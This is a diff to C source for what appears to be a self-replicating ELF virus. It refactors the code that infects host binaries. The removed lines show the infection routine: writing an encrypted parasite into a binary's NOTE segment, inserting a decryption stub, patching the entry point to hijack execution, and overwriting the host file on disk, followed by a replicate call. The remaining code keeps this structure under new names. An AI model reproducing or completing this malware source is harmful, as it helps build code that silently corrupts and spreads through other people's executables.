@@ -1,7 +1,7 @@
 #include <war.h>
 
 ////////////////////////////////////////////////////////////////////////////////
-/// STATIC FUNCTIONS
+/// STATIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
 __attribute__((always_inline)) static inline void write_on_memory(char *dst, char *src, Elf64_Phdr **segment)
@@ -14,59 +14,14 @@ __attribute__((always_inline)) static inline void write_on_memory(char *dst, cha
 	for (register size_t index = 0; index < beg_stub; index++)
 		*dst++ = *src++;
 	for (register size_t index = 0; index < end_stub; index++)
-		*dst++ = '*';
+		*dst++ = 0;
 
 	src += STUB_SIZE;
 
 	for (register size_t index = 0; index < beg_parasite; index++)
 		*dst++ = *src++;
 	for (register size_t index = 0; index < end_parasite; index++)
-		*dst++ = '*';
-}
-
-__attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)
-{
-	char *stub = (char *)L1;
-
-	const size_t patch_address = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (STUB_SIZE - (ADDR_OFFSET + 0x4)));
-	const size_t patch_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
-	const size_t patch_jump = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz));
-
-	const size_t size = sizeof(int);
-
-	_memcpy(stub + ADDR_OFFSET, &patch_address, size); 
-	_memcpy(stub + SIZE_OFFSET, &patch_size, size);
-	_memcpy(stub + (STUB_SIZE - 0x4), &patch_jump, size);
-
-	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE), stub, STUB_SIZE);
-}
-
-__attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf64_Phdr **segment)
-{
-	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
-}
-
-__attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)
-{
-	size_t offset = JUMP_SIZE;
-
-	dst += host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);
-
-	while (true)
-	{
-		if (*(unsigned char *)dst == 0xe9)
-		{
-			dst++;
-			offset++;
-			break;
-		}
-		offset++;
-		dst++;
-	}
-
-	const size_t entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + (((void *)execution + offset) - (void *)__entry));
-
-	_memcpy(dst, &entry_point, sizeof(int));
+		*dst++ = 0;
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -84,40 +39,21 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	if (context == FAILURE)
 		goto label;
 
-	char *ptr;
-	int fd;
+	struct s_injection injection;
 
-	const size_t filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;
+	injection.filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;
 
-	if ((ptr = _mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
+	if ((injection.ptr = _mmap(NULL, injection.filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
 	{
 		context = FAILURE;
 		goto label;
 	}
 
-	unsigned char key[] = "********";
-
-	write_on_memory(ptr, (char *)host->header, host->segment);
-	insert_stub(ptr, host->segment);
-	insert_parasite(ptr, host->segment);
-	patch_entry_point(ptr, host);
-	RC4(key, DEFAULT_KEY_SIZE, ptr + host->segment[NOTE]->p_offset, ((void *)__exit - (void *)__entry) + FCNT_SIZE);
-//	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);
-
-	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
-	{
-		context = FAILURE;
-		goto label;
-	}
-
-	_write(fd, ptr, filesize);
-	_close(fd);
-	_munmap(ptr, filesize);
-	_munmap(host->header, host->filesize);
+	write_on_memory(injection.ptr, (char *)host->header, host->segment);
 
 label:
 //	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
 //	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
 
-	replicate(host, keychain, context);
+	parasite(host, keychain, context, &injection);
 }
